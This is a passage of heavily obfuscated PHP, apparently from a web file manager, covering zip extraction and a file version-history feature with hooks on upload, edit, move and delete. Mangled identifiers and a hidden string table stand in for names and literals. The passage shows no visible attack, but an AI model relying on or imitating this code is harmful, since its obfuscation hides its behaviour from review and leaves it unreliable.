$›Á¥÷Ç, get_path_this($Ÿ­İ“ïğ[$‡Ş¶–¬¬[42]])); die; } private static function zipFileList($—ó—ô, $ß½±şåû = false) { $ôòÓï ¾ =& $_SERVER[Å¶¨Şêº]; $¬áÑ’¶ª = array(); foreach ($—ó—ô as $±¨Î¹ß) { $¿ıñÚø = $±¨Î¹ß[$ôòÓï ¾[95]]; if ($ß½±şåû) { $¿ıñÚø = self::copy($±¨Î¹ß[$ôòÓï ¾[95]], $ß½±şåû, $ôòÓï ¾[816]); } else { $¦ÓÆÌ¹É = self::init($±¨Î¹ß[$ôòÓï ¾[95]]); if ($¦ÓÆÌ¹É->getType() == $ôòÓï ¾[117]) { $¿ıñÚø = $¦ÓÆÌ¹É->path; } } if ($¿ıñÚø && self::local()->exist($¿ıñÚø)) { $¬áÑ’¶ª[$±¨Î¹ß[$ôòÓï ¾[95]]] = $¿ıñÚø; } } if (!empty($¬áÑ’¶ª)) { return array_values($¬áÑ’¶ª); } show_json(LNG($ôòÓï ¾[1162]), !1); } private static function localFilePath($­Û§ßõ) { $ƒŸÑîâ =& $_SERVER[Å¶¨Şêº]; $İÌæ‰ĞŸ = KodIO::parse($­Û§ßõ); if ($İÌæ‰ĞŸ[$ƒŸÑîâ[43]] == KodIO::KOD_SOURCE) { $‹½Ş—Ì§ = Model($ƒŸÑîâ[823])->fileInfoGet(KodIO::sourceID($­Û§ßõ)); if (!$‹½Ş—Ì§[$ƒŸÑîâ[95]]) { show_json($ƒŸÑîâ[1201], !1); } $­Û§ßõ = $‹½Ş—Ì§[$ƒŸÑîâ[95]]; } $šÔûñ¸¹ = self::init($­Û§ßõ); if ($šÔûñ¸¹->pathParse[$ƒŸÑîâ[1148]]) { $­Û§ßõ = $šÔûñ¸¹->pathParse[$ƒŸÑîâ[1148]]; $šÔûñ¸¹ = self::init($­Û§ßõ); } $„Ë·ûØË = $šÔûñ¸¹->getType(); if ($„Ë·ûØË == $ƒŸÑîâ[117] || $„Ë·ûØË == $ƒŸÑîâ[1202]) { if (!$šÔûñ¸¹->exist($šÔûñ¸¹->path)) { show_json(LNG($ƒŸÑîâ[116]), !1); } return $šÔûñ¸¹->path; } return !1; } public static function unzipPart($²’†¹–×, $®ÔÍ öß = -1) { $ƒ™õãİ =& $_SERVER[Å¶¨Şêº]; $£äºËïş = IO::pathThis($²’†¹–×); if (!$®ÔÍ öß || $®ÔÍ öß == -1) { $•œšŞşÅ = array(array($ƒ™õãİ[42] => $£äºËïş, $ƒ™õãİ[1188] => -1)); $•œšŞşÅ[0][$ƒ™õãİ[1203]] = $•œšŞşÅ[0][$ƒ™õãİ[42]]; } else { if (is_array($®ÔÍ öß)) { $•œšŞşÅ = $®ÔÍ öß; $İ”£¾¬ğ = count($•œšŞşÅ) - 1; for ($ÛŸÉ¨Ñ = 0; $ÛŸÉ¨Ñ <= $İ”£¾¬ğ; $ÛŸÉ¨Ñ++) { $¬ª¹»Å = $•œšŞşÅ[$ÛŸÉ¨Ñ]; $ïŠ‘¼Ú = get_path_this($¬ª¹»Å[$ƒ™õãİ[42]]) . (checkExtSafe($¬ª¹»Å[$ƒ™õãİ[42]]) ? $ƒ™õãİ[12] : $ƒ™õãİ[1204]); $•œšŞşÅ[$ÛŸÉ¨Ñ][$ƒ™õãİ[1203]] = $ƒ™õãİ[1205] . intval($¬ª¹»Å[$ƒ™õãİ[1188]]) . $ƒ™õãİ[395] . $ïŠ‘¼Ú; if ($ÛŸÉ¨Ñ == 0) { continue; } $•œšŞşÅ[$ÛŸÉ¨Ñ][$ƒ™õãİ[1203]] = $•œšŞşÅ[$ÛŸÉ¨Ñ - 1][$ƒ™õãİ[1203]] . $ƒ™õãİ[1206] . $•œšŞşÅ[$ÛŸÉ¨Ñ][$ƒ™õãİ[1203]]; } } } if (!is_array($•œšŞşÅ) || count($•œšŞşÅ) == 0) { return !1; } $‰Ü‹ô­ = $•œšŞşÅ[count($•œšŞşÅ) - 1]; if (!IO::exist($²’†¹–×)) { return !1; } $ĞÁ¿üÈÖ = TEMP_FILES . $ƒ™õãİ[1207] . kodIO::hashPathSafe($²’†¹–×) . $ƒ™õãİ[8]; $ö¦Ÿˆ‰ù = $ĞÁ¿üÈÖ . $‰Ü‹ô­[$ƒ™õãİ[1203]]; mk_dir($ĞÁ¿üÈÖ); file_put_contents(TEMP_FILES . $ƒ™õãİ[1182], $ƒ™õãİ[12]); if (IO::exist($ö¦Ÿˆ‰ù)) { return array($ƒ™õãİ[211] => $ö¦Ÿˆ‰ù, $ƒ™õãİ[1187] => $•œšŞşÅ, $ƒ™õãİ[1189] => $ĞÁ¿üÈÖ); } $ŒÅóŒ„¬ = self::localFilePath($²’†¹–×); if (!$ŒÅóŒ„¬) { $ŒÅóŒ„¬ = $ĞÁ¿üÈÖ . $ƒ™õãİ[1208]; if (!IO::exist($ŒÅóŒ„¬)) { self::copy($²’†¹–×, $ĞÁ¿üÈÖ, !1, get_path_this($ŒÅóŒ„¬)); } } if (!$ŒÅóŒ„¬ || !IO::exist($ŒÅóŒ„¬)) { return !1; } if ($‰Ü‹ô­[$ƒ™õãİ[1188]] == -1) { return array($ƒ™õãİ[211] => $ŒÅóŒ„¬, $ƒ™õãİ[1187] => $•œšŞşÅ, $ƒ™õãİ[1189] => $ĞÁ¿üÈÖ); } $Çø÷é¡¹ = $ŒÅóŒ„¬; foreach ($•œšŞşÅ as $ÛŸÉ¨Ñ => $¬ª¹»Å) { if (!$¬ª¹»Å || $¬ª¹»Å[$ƒ™õãİ[1188]] == $ƒ™õãİ[1186]) { break; } if (substr($¬ª¹»Å[$ƒ™õãİ[42]], -1, 1) == $ƒ™õãİ[8]) { break; } $ÏÔ•ûÙ— = in_array(get_path_ext($¬ª¹»Å[$ƒ™õãİ[1203]]), array($ƒ™õãİ[323], $ƒ™õãİ[1193], $ƒ™õãİ[1194], $ƒ™õãİ[1195], $ƒ™õãİ[1196], $ƒ™õãİ[1197])); $·Ô”™ = $ÛŸÉ¨Ñ == count($•œšŞşÅ) - 1 && $ÏÔ•ûÙ—; $áÖ¨˜äê = $ĞÁ¿üÈÖ . $¬ª¹»Å[$ƒ™õãİ[1203]]; $´Áú²•Ã = $ĞÁ¿üÈÖ . get_path_this($¬ª¹»Å[$ƒ™õãİ[42]]); if (IO::exist($áÖ¨˜äê)) { $Çø÷é¡¹ = $áÖ¨˜äê; continue; } $¢™ü¼¼ = $ÛŸÉ¨Ñ == 0 ? get_path_ext($£äºËïş) : get_path_ext($Çø÷é¡¹); $¦Ÿ¯Óöœ = KodArchive::extract(self::iconvSystem($Çø÷é¡¹), $ĞÁ¿üÈÖ, $¬ª¹»Å[$ƒ™õãİ[1188]], $¨™Ú÷ÁÛ, $¢™ü¼¼); self::unzipErrorCheck($¦Ÿ¯Óöœ, array($ƒ™õãİ[1209], $²’†¹–×, $•œšŞşÅ, $¬ª¹»Å, $áÖ¨˜äê)); if (IO::exist($´Áú²•Ã)) { IO::rename($´Áú²•Ã, get_path_this($áÖ¨˜äê)); } $Çø÷é¡¹ = $áÖ¨˜äê; } $ö¦Ÿˆ‰ù = $Çø÷é¡¹; return array($ƒ™õãİ[211] => $Çø÷é¡¹, $ƒ™õãİ[1187] => $•œšŞşÅ, $ƒ™õãİ[1189] => $ĞÁ¿üÈÖ); } private static function unzipErrorCheck($–ËÖğµí, $æ§¾›Š = false) { $ùÆæÅ¡Ê =& $_SERVER[Å¶¨Şêº]; if ($–ËÖğµí[$ùÆæÅ¡Ê[1210]]) { return !0; } write_log(array($ùÆæÅ¡Ê[1211], $–ËÖğµí, $æ§¾›Š), $ùÆæÅ¡Ê[1212]); show_json($ùÆæÅ¡Ê[1213] . json_encode($–ËÖğµí[$ùÆæÅ¡Ê[1200]]), !1); die; } } goto EŸ¦‚‚Ş¾ç; EŸ¦‚‚Ş¾ç: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ÿ…ŒóŠÓ =& $_SERVER[Å¶¨Şêº]; $¬µÔ¦»  = $GLOBALS[$Ÿ…ŒóŠÓ[6]][$Ÿ…ŒóŠÓ[100]]; if ($¬µÔ¦» [$Ÿ…ŒóŠÓ[1214]] != 1) { return; } if ($¬µÔ¦» [$Ÿ…ŒóŠÓ[1215]] <= 0) { return; } if (isset($_REQUEST[$Ÿ…ŒóŠÓ[1216]]) && $_REQUEST[$Ÿ…ŒóŠÓ[1216]] == $Ÿ…ŒóŠÓ[99]) { return; } Hook::bind($Ÿ…ŒóŠÓ[1217], $Ÿ…ŒóŠÓ[1218]); Hook::bind($Ÿ…ŒóŠÓ[1219], $Ÿ…ŒóŠÓ[1220]); Hook::bind($Ÿ…ŒóŠÓ[1221], $Ÿ…ŒóŠÓ[1222]); Hook::bind($Ÿ…ŒóŠÓ[1223], $Ÿ…ŒóŠÓ[1224]); Hook::bind($Ÿ…ŒóŠÓ[1225], $Ÿ…ŒóŠÓ[1226]); Hook::bind($Ÿ…ŒóŠÓ[1227], $Ÿ…ŒóŠÓ[1228]); } public static function eventBeforeUpload($ãšÀª¸”) { if ($ãšÀª¸”[3] && $ãšÀª¸”[3] != REPEAT_REPLACE) { return; } $ŠÜ†ùíô = self::parsePath($ãšÀª¸”[0]); if (!$ŠÜ†ùíô) { return; } self::add($ŠÜ†ùíô); } public static function eventBeforeEdit($ ü²) { $ôÌîáıî = self::parsePath($ ü²[0]); if (!$ôÌîáıî) { return; } self::add($ôÌîáıî); } public static function eventBeforeCopyFile($¡éÆóÙ, $ï¬ÎóÆÒ, $ÏŒ¨¨¨Ô, $À´Õâºê, $¨Å…Â¥», $¦ÛÖÏ) { $¼™ËòÜç =& $_SERVER[Å¶¨Şêº]; if (isset($ÏŒ¨¨¨Ô->_data[$¼™ËòÜç[1152]]) && $ÏŒ¨¨¨Ô->_data[$¼™ËòÜç[1152]]) { return; } $í§ëŒ÷ = $ÏŒ¨¨¨Ô->getPathOuter($À´Õâºê); $ˆè¤Òø  = self::parsePath($í§ëŒ÷); if (!$ˆè¤Òø ) { return; } self::add($ˆè¤Òø ); } public static function eventBeforeRename($¹…¬¶Ä) { $èõªŸËã =& $_SERVER[Å¶¨Şêº]; $ü»Ê™°û = self::parsePath($¹…¬¶Ä[0]); if (!$ü»Ê™°û) { return; } $º›²„­ä = self::checkInHistory($ü»Ê™°û); if (!$º›²„­ä) { return; } if ($º›²„­ä[$èõªŸËã[43]] == $èõªŸËã[211]) { $©ãÎÏµÂ = self::listData($ü»Ê™°û); if ($©ãÎÏµÂ && $©ãÎÏµÂ[$èõªŸËã[379]]) { self::moveHistory($ü»Ê™°û, $¹…¬¶Ä[1]); } } else { IO::rename($º›²„­ä[$èõªŸËã[95]], $¹…¬¶Ä[1]); } } public static function eventBeforeMove($¬“İÌ‹…) { $Ö“º™é =& $_SERVER[Å¶¨Şêº]; $¦ëÔ¿ÉÒ = self::parsePath($¬“İÌ‹…[0]); if (!$¦ëÔ¿ÉÒ) { return; } $õµ›ĞÎ¥ = self::parsePath($¬“İÌ‹…[1]); if (!$õµ›ĞÎ¥) { return; } $Ëö £Ù¨ = $¬“İÌ‹…[3]; $ª•ï­• = self::checkInHistory($¦ëÔ¿ÉÒ); if (!$ª•ï­•) { return; } $‚ªÚ³õ× = self::pathHistory($õµ›ĞÎ¥); if ($ª•ï­•[$Ö“º™é[43]] == $Ö“º™é[211]) { $€Äæğê¹ = self::listData($¦ëÔ¿ÉÒ); $İĞ¹ğş® = rtrim($õµ›ĞÎ¥, $Ö“º™é[8]) . $Ö“º™é[8] . ($Ëö £Ù¨ ? $Ëö £Ù¨ : get_path_this($¦ëÔ¿ÉÒ)); $íùÅ¸£İ = self::listData($İĞ¹ğş®); if ($€Äæğê¹ && $€Äæğê¹[$Ö“º™é[379]] && $íùÅ¸£İ && $íùÅ¸£İ[$Ö“º™é[379]]) { return self::clear($¦ëÔ¿ÉÒ); } if ($€Äæğê¹ && $€Äæğê¹[$Ö“º™é[379]]) { self::moveHistory($¦ëÔ¿ÉÒ, $Ëö £Ù¨, $‚ªÚ³õ×); } } else { IO::move($ª•ï­•[$Ö“º™é[95]], $‚ªÚ³õ×, !1, $Ëö £Ù¨); self::clearEmptyFolder(IO::pathFather($ª•ï­•[$Ö“º™é[95]])); } } public static function eventAfterRemove($©¤ì¼¾¤, $öµñŸ“ç) { $¬²¸é» =& $_SERVER[Å¶¨Şêº]; if (!$öµñŸ“ç) { return; } $«õÂš”œ = self::parsePath($©¤ì¼¾¤[0]); if (!$«õÂš”œ) { return; } $Ë¿¬‚Üà = self::checkInHistory($«õÂš”œ); if (!$Ë¿¬‚Üà) { return; } if ($Ë¿¬‚Üà[$¬²¸é»[43]] == $¬²¸é»[211]) { $Çõ¾óê = self::listData($«õÂš”œ, !1); if ($Çõ¾óê && $Çõ¾óê[$¬²¸é»[379]]) { self::clear($«õÂš”œ, !1); } } else { IO::remove($Ë¿¬‚Üà[$¬²¸é»[95]]); self::clearEmptyFolder(IO::pathFather($Ë¿¬‚Üà[$¬²¸é»[95]])); } } private static function checkInHistory($æ£”ñ”) { $éí½úèå = self::pathHistory($æ£”ñ”); if (!IO::exist($éí½úèå)) { $éí½úèå .= $_SERVER[Å¶¨Şêº][1229]; } return IO::exist($éí½úèå) ? IO::info($éí½úèå) : !1; } private static function parsePath($±„Ë‚Ï) { $ÂªŸöÄĞ =& $_SERVER[Å¶¨Şêº]; if (!$±„Ë‚Ï) { return !1; } if ($GLOBALS[$ÂªŸöÄĞ[1230]]) { return; } $¡†àÄ… = KodIO::parse($±„Ë‚Ï); $®ÌéıÀ = $¡†àÄ…[$ÂªŸöÄĞ[43]]; $ØÂÁÇØ– = !$®ÌéıÀ || $®ÌéıÀ == KodIO::KOD_IO || $®ÌéıÀ == KodIO::KOD_SHARE_ITEM; if (!$ØÂÁÇØ– || !$¡†àÄ…[$ÂªŸöÄĞ[1231]]) { return !1; } if (substr($±„Ë‚Ï, 0, strlen(DATA_PATH . $ÂªŸöÄĞ[1232])) == DATA_PATH . $ÂªŸöÄĞ[1232]) { return !1; } if ($®ÌéıÀ == KodIO::KOD_SHARE_ITEM) { $¹¦Ø±ó = IO::init($±„Ë‚Ï); if ($¹¦Ø±ó->pathParse[$ÂªŸöÄĞ[1148]]) { return self::parsePath($¹¦Ø±ó->pathParse[$ÂªŸöÄĞ[1148]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ŠõÍ•ñ¡ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÂªŸöÄĞ[1233]); foreach ($ŠõÍ•ñ¡ as $…å®¢áÂ) { if (!$®ÌéıÀ && substr($±„Ë‚Ï, 0, strlen($…å®¢áÂ)) == $…å®¢áÂ) { return !1; } } self::log($GLOBALS[$ÂªŸöÄĞ[1143]] . $ÂªŸöÄĞ[1234] . $±„Ë‚Ï); return $±„Ë‚Ï; } private static function pathHistory($È¦¼ÛÊ¦) { $‡ÊŞÍƒŒ =& $_SERVER[Å¶¨Şêº]; $”ƒ±İ‰ = self::$_historyBase . ltrim(KodIO::clear($È¦¼ÛÊ¦), $‡ÊŞÍƒŒ[8]); $”ƒ±İ‰ = str_replace(array($‡ÊŞÍƒŒ[1235]), array($‡ÊŞÍƒŒ[1236]), $”ƒ±İ‰); return $”ƒ±İ‰; } public static function log($ÒÔš£ëè) { } public static function historyCount($“Ğøïõ) { $½â—¾æÒ =& $_SERVER[Å¶¨Şêº]; $ŞÁÚÂ«é = array(); $ºÌÙ³Æ‹ = array(); foreach ($“Ğøïõ as $‚úİ›â») { $ùÖÏŒ‰Õ = get_path_father($‚úİ›â»); if (!$ºÌÙ³Æ‹[$ùÖÏŒ‰Õ]) { $ºÌÙ³Æ‹[$ùÖÏŒ‰Õ] = array(); } $ºÌÙ³Æ‹[$ùÖÏŒ‰Õ][] = get_path_this($‚úİ›â»); } foreach ($ºÌÙ³Æ‹ as $ùÖÏŒ‰Õ => $ø‹¦¶„) { $ÎÅ€³Ãé = self::parsePath($ùÖÏŒ‰Õ); if (!$ÎÅ€³Ãé) { continue; } foreach ($ø‹¦¶„ as $š€Şìêü) { $Šé’°™ = self::listData(rtrim($ÎÅ€³Ãé, $½â—¾æÒ[8]) . $½â—¾æÒ[8] . $š€Şìêü, !1); if ($Šé’°™ && $Šé’°™[$½â—¾æÒ[379]]) { $ŞÁÚÂ«é[rtrim($ùÖÏŒ‰Õ, $½â—¾æÒ[8]) . $½â—¾æÒ[8] . $š€Şìêü] = count($Šé’°™[$½â—¾æÒ[379]]); } } } return $ŞÁÚÂ«é; } public static function add($†£¯ôÖ¢) { $±Ú¸ÖÜ =& $_SERVER[Å¶¨Şêº]; $ê¿¸æ§ø = self::listData($†£¯ôÖ¢); if (!$ê¿¸æ§ø) { return; } $—à·½Íá = Model($±Ú¸ÖÜ[768])->get($±Ú¸ÖÜ[1237]); $¥Ê˜æ²¦ = $GLOBALS[$±Ú¸ÖÜ[6]][$±Ú¸ÖÜ[100]][$±Ú¸ÖÜ[1215]]; $Ã±º‘ü = $—à·½Íá == $±Ú¸ÖÜ[1238] ? min(5, $¥Ê˜æ²¦) : $¥Ê˜æ²¦; if ($¥Ê˜æ²¦ <= 0) { return; } $ª–ãÕÓ” = IO::info($†£¯ôÖ¢); $©æŠ¶ïâ = $ê¿¸æ§ø[$±Ú¸ÖÜ[379]]; if ($ª–ãÕÓ”[$±Ú¸ÖÜ[87]] == 0) { return; } if ($ª–ãÕÓ”[$±Ú¸ÖÜ[87]] >= 1024 * 1024 * 500) { return !1; } $»î‰Û‹„ = IO::hashSimple($†£¯ôÖ¢); if ($©æŠ¶ïâ && $©æŠ¶ïâ[0][$±Ú¸ÖÜ[188]] == $»î‰Û‹„) { return !0; } if (array_key_exists($±Ú¸ÖÜ[214], $ª–ãÕÓ”) && !$ª–ãÕÓ”[$±Ú¸ÖÜ[214]]) { return !1; } $ùÎŞ…Ÿ° = short_id(time()); $ğ•êÍœ” = array($±Ú¸ÖÜ[408] => $ùÎŞ…Ÿ°, $±Ú¸ÖÜ[188] => $»î‰Û‹„, $±Ú¸ÖÜ[42] => $ª–ãÕÓ”[$±Ú¸ÖÜ[42]] . $±Ú¸ÖÜ[10] . date($±Ú¸ÖÜ[1239]) . rand_string(1), $±Ú¸ÖÜ[87] => $ª–ãÕÓ”[$±Ú¸ÖÜ[87]], $±Ú¸ÖÜ[463] => USER_ID, $±Ú¸ÖÜ[212] => time(), $±Ú¸ÖÜ[1240] => $±Ú¸ÖÜ[12]); IO::mkdir($ê¿¸æ§ø[$±Ú¸ÖÜ[1241]]); $‡ñ¬üÃ• = IO::copy($†£¯ôÖ¢, $ê¿¸æ§ø[$±Ú¸ÖÜ[1241]], !1, $ğ•êÍœ”[$±Ú¸ÖÜ[42]]); if (!$‡ñ¬üÃ•) { self::clearEmptyFolder($ê¿¸æ§ø[$±Ú¸ÖÜ[1241]]); return !1; } array_unshift($©æŠ¶ïâ, $ğ•êÍœ”); if (count($©æŠ¶ïâ) > $Ã±º‘ü) { $áîìã‚  = array_slice($©æŠ¶ïâ, $Ã±º‘ü); foreach ($áîìã‚  as $–¤¬ÉÊ) { IO::remove($ê¿¸æ§ø[$±Ú¸ÖÜ[1241]] . $–¤¬ÉÊ[$±Ú¸ÖÜ[42]]); } $©æŠ¶ïâ = array_slice($©æŠ¶ïâ, 0, $Ã±º‘ü); } return self::saveData($ê¿¸æ§ø[$±Ú¸ÖÜ[1242]], $©æŠ¶ïâ); } public static function remove($Ş»ÌêÛ, $ğó¡éÇè) { $›·Íº«ú =& $_SERVER[Å¶¨Şêº]; $¿ÓÂ¼¢Ğ = self::listData($Ş»ÌêÛ); $É½˜âê = array(); if (!$¿ÓÂ¼¢Ğ) { return !1; } foreach ($¿ÓÂ¼¢Ğ[$›·Íº«ú[379]] as $õ¶¨¤Ê) { if ($õ¶¨¤Ê[$›·Íº«ú[408]] == $ğó¡éÇè) { IO::remove($¿ÓÂ¼¢Ğ[$›·Íº«ú[1241]] . $õ¶¨¤Ê[$›·Íº«ú[42]]); continue; } $É½˜âê[] = $õ¶¨¤Ê; } return self::saveData($¿ÓÂ¼¢Ğ[$›·Íº«ú[1242]], $É½˜âê); } public static function clear($®ûê¡æá, $Í¢’¡ôı = true) { $ãÒœªŠ =& $_SERVER[Å¶¨Şêº]; $º ­Šğ = self::listData($®ûê¡æá, $Í¢’¡ôı); if (!$º ­Šğ) { return !1; } foreach ($º ­Šğ[$ãÒœªŠ[379]] as $¢¿áâõ¤) { IO::remove($º ­Šğ[$ãÒœªŠ[1241]] . $¢¿áâõ¤[$ãÒœªŠ[42]]); } return self::saveData($º ­Šğ[$ãÒœªŠ[1242]], array()); } public static function moveHistory($ŞÕóÃ«š, $ÅĞÅ¥Î• = '', $Í¢È¹µ± = '') { $Ó—€å¸¬ =& $_SERVER[Å¶¨Şêº]; $Ê©öİ®æ = self::listData($ŞÕóÃ«š, !1); if (!$Ê©öİ®æ || !$Ê©öİ®æ[$Ó—€å¸¬[379]]) { return !1; } $ÚÀï‹ºÊ = $Ó—€å¸¬[1229]; $ÅĞÅ¥Î• = $ÅĞÅ¥Î• ? $ÅĞÅ¥Î• : get_path_this($ŞÕóÃ«š); $Í¢È¹µ± = $Í¢È¹µ± ? $Í¢È¹µ± : $Ê©öİ®æ[$Ó—€å¸¬[1241]]; $ëÃÇşÆª = substr(get_path_this($Ê©öİ®æ[$Ó—€å¸¬[1242]]), 0, -strlen($ÚÀï‹ºÊ)); foreach ($Ê©öİ®æ[$Ó—€å¸¬[379]] as $–ÅÈóã => $Í·Ï ²®) { $Öı·¿ê½ = $ÅĞÅ¥Î• . substr($Í·Ï ²®[$Ó—€å¸¬[42]], strlen($ëÃÇşÆª)); $«ÁºÏª = IO::move($Ê©öİ®æ[$Ó—€å¸¬[1241]] . $Í·Ï ²®[$Ó—€å¸¬[42]], $Í¢È¹µ±, !1, $Öı·¿ê½); if ($«ÁºÏª) { $Ê©öİ®æ[$Ó—€å¸¬[379]][$–ÅÈóã][$Ó—€å¸¬[42]] = $Öı·¿ê½; } } $Ê©öİ®æ[$Ó—€å¸¬[1242]] = IO::move($Ê©öİ®æ[$Ó—€å¸¬[1242]], $Í¢È¹µ±, !1, $ÅĞÅ¥Î• . $ÚÀï‹ºÊ); self::saveData($Ê©öİ®æ[$Ó—€å¸¬[1242]], $Ê©öİ®æ[$Ó—€å¸¬[379]]); self::clearEmptyFolder($Ê©öİ®æ[$Ó—€å¸¬[1241]]); } public static function rollback($Ê¼æÖ±å, $›£é¡í) { $îÑµˆŸ =& $_SERVER[Å¶¨Şêº]; $¬Ü‘Å’œ = self::listData($Ê¼æÖ±å); if (!$¬Ü‘Å’œ) { return; } $Şœîñ² = IO::info($Ê¼æÖ±å); foreach ($¬Ü‘Å’œ[$îÑµˆŸ[379]] as $›¶™Ïø¶ => $Ú«¸ĞÈ) { if ($Ú«¸ĞÈ[$îÑµˆŸ[408]] == $›£é¡í) { self::add($Ê¼æÖ±å); $¯ïÃ€Ú¬ = $¬Ü‘Å’œ[$îÑµˆŸ[1241]] . $Ú«¸ĞÈ[$îÑµˆŸ[42]]; $©ˆš¤Ô¾ = IO::copy($¯ïÃ€Ú¬, IO::pathFather($Ê¼æÖ±å), REPEAT_REPLACE, $Şœîñ²[$îÑµˆŸ[42]]); if ($©ˆš¤Ô¾) { self::remove($Ê¼æÖ±å, $›£é¡í); } return $©ˆš¤Ô¾; } } return !1; } public static function setDetail($ïñëŞ“§, $¾ùŠ¼Ê£, $üİ²å) { $ûâ¿–“‡ =& $_SERVER[Å¶¨Şêº]; $›ÌÀÆ§ô = self::listData($ïñëŞ“§); if (!$›ÌÀÆ§ô) { return; } foreach ($›ÌÀÆ§ô[$ûâ¿–“‡[379]] as $«œµ¡Ú– => $ƒõ„ë‘ö) { if ($ƒõ„ë‘ö[$ûâ¿–“‡[408]] == $¾ùŠ¼Ê£) { $›ÌÀÆ§ô[$ûâ¿–“‡[379]][$«œµ¡Ú–][$ûâ¿–“‡[1240]] = $üİ²å; self::saveData($›ÌÀÆ§ô[$ûâ¿–“‡[1242]], $›ÌÀÆ§ô[$ûâ¿–“‡[379]]); return !0; } } return !1; } public static function fileInfo($›“ÕâÛö, $Ã¬°‘) { $ãĞãÑ¹Ú =& $_SERVER[Å¶¨Şêº]; $«ß§ï¼ = self::listData($›“ÕâÛö); if (!$«ß§ï¼) { show_json(LNG($ãĞãÑ¹Ú[116]), !1); } $½ÜˆÏ‚Ù = $ãĞãÑ¹Ú[12]; foreach ($«ß§ï¼[$ãĞãÑ¹Ú[379]] as $éÃñ¦¸– => $íÈ³®°ñ) { if ($íÈ³®°ñ[$ãĞãÑ¹Ú[408]] != $Ã¬°‘) { continue; } $½ÜˆÏ‚Ù = $«ß§ï¼[$ãĞãÑ¹Ú[1241]] . $íÈ³®°ñ[$ãĞãÑ¹Ú[42]]; break; } if (!$½ÜˆÏ‚Ù) { show_json(LNG($ãĞãÑ¹Ú[116]), !1); } return IO::info($½ÜˆÏ‚Ù); } public static function fileOut($Ù¯¤ö¢ì, $éõ†ğàÛ, $‰Æ‹•È° = false) { $ÙáÑ¥ =& $_SERVER[Å¶¨Şêº]; $®á§úéº = self::fileInfo($Ù¯¤ö¢ì, $éõ†ğàÛ); $ƒÏ®ìñ =& $GLOBALS[$ÙáÑ¥[7]]; $‰Æ‹•È° = isset($ƒÏ®ìñ[$ÙáÑ¥[1192]]) && $ƒÏ®ìñ[$ÙáÑ¥[1192]] == 1; if (isset($ƒÏ®ìñ[$ÙáÑ¥[43]]) && $ƒÏ®ìñ[$ÙáÑ¥[43]] == $ÙáÑ¥[1243]) { return IO::fileOutImage($®á§úéº[$ÙáÑ¥[95]], $ƒÏ®ìñ[$ÙáÑ¥[1244]]); } IO::fileOut($®á§úéº[$ÙáÑ¥[95]], $‰Æ‹•È°, get_path_this($Ù¯¤ö¢ì)); } public static function listData($Í¥õ‡ŠÀ, $ŒêâÔü = true) { $Ëğâ­Ì =& $_SERVER[Å¶¨Şêº]; if ($ŒêâÔü && !IO::exist($Í¥õ‡ŠÀ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Í¥õ‡ŠÀ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $½Ú†ŠŠü = self::pathHistory($Í¥õ‡ŠÀ); $¤Ü­äÁ¿ = array($Ëğâ­Ì[1242] => $½Ú†ŠŠü . $Ëğâ­Ì[1229], $Ëğâ­Ì[1241] => rtrim(get_path_father($½Ú†ŠŠü), $Ëğâ­Ì[8]) . $Ëğâ­Ì[8], $Ëğâ­Ì[379] => array()); $Áêòß²ƒ = IO::getContent($¤Ü­äÁ¿[$Ëğâ­Ì[1242]]); if ($Áêòß²ƒ) { $°äØçÜ  = json_decode($Áêòß²ƒ, !0); if (is_array($°äØçÜ )) { $¤Ü­äÁ¿[$Ëğâ­Ì[379]] = $°äØçÜ ; } } return $¤Ü­äÁ¿; } private static function saveData($±šÄ—Ö°, $˜›Ô‚ï¦) { $¸¡öù…Á =& $_SERVER[Å¶¨Şêº]; self::log($¸¡öù…Á[1245] . $±šÄ—Ö° . $¸¡öù…Á[82] . count($˜›Ô‚ï¦), $¸¡öù…Á[749]); if ($˜›Ô‚ï¦) { return IO::setContent($±šÄ—Ö°, json_encode($˜›Ô‚ï¦)); } $ÅÒÙö = IO::pathFather($±šÄ—Ö°); IO::remove($±šÄ—Ö°); self::clearEmptyFolder($ÅÒÙö); return !0; } public static function clearEmptyFolder($ÒĞí¶ò) { $ƒÃ¶àğû =& $_SERVER[Å¶¨Şêº]; if (trim($ÒĞí¶ò, $ƒÃ¶àğû[8]) == trim(self::$_historyBase, $ƒÃ¶àğû[8])) { return; } $šçÏñƒ‚ = IO::pathFather($ÒĞí¶ò); $á§½û‹“ = IO::has($ÒĞí¶ò, !0); if ($á§½û‹“[$ƒÃ¶àğû[218]] > 0 || $á§½û‹“[$ƒÃ¶àğû[219]] > 0) { return; } IO::remove($ÒĞí¶ò); self::clearEmptyFolder($šçÏñƒ‚); } private static function getBasePath() { $åŸßóñ‘ =& $_SERVER[Å¶¨Şêº]; $ò§Çø¶ = Model($åŸßóñ‘[1246])->get($åŸßóñ‘[1247]); if ($ò§Çø¶) { if (!IO::exist($ò§Çø¶)) { IO::mkdir($ò§Çø¶); } if (get_path_this($ò§Çø¶) == $åŸßóñ‘[1232]) { $¾®îÂ±« = $åŸßóñ‘[1248] . rand_string(8); @rename($ò§Çø¶, get_path_father($ò§Çø¶) . $åŸßóñ‘[8] . $¾®îÂ±«); $ò§Çø¶ = DATA_PATH . $¾®îÂ±« . $åŸßóñ‘[8]; file_put_contents(DATA_PATH . $åŸßóñ‘[1182], $åŸßóñ‘[12]); Model($åŸßóñ‘[1246])->set($åŸßóñ‘[1247], $ò§Çø¶); } return $ò§Çø¶; } $ò§Çø¶ = DATA_PATH . $åŸßóñ‘[1248] . rand_string(8) . $åŸßóñ‘[8]; $ò§Çø¶ = IO::mkdir($ò§Çø¶); $ò§Çø¶ = rtrim($ò§Çø¶, $åŸßóñ‘[8]) . $åŸßóñ‘[8]; file_put_contents($ò§Çø¶ . $åŸßóñ‘[1182], $åŸßóñ‘[12]); file_put_contents(DATA_PATH . $åŸßóñ‘[1182], $åŸßóñ‘[12]); Model($åŸßóñ‘[1246])->set($åŸßóñ‘[1247], $ò§Çø¶); return $ò§Çø¶; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\122\145\x63\171\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\163\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = 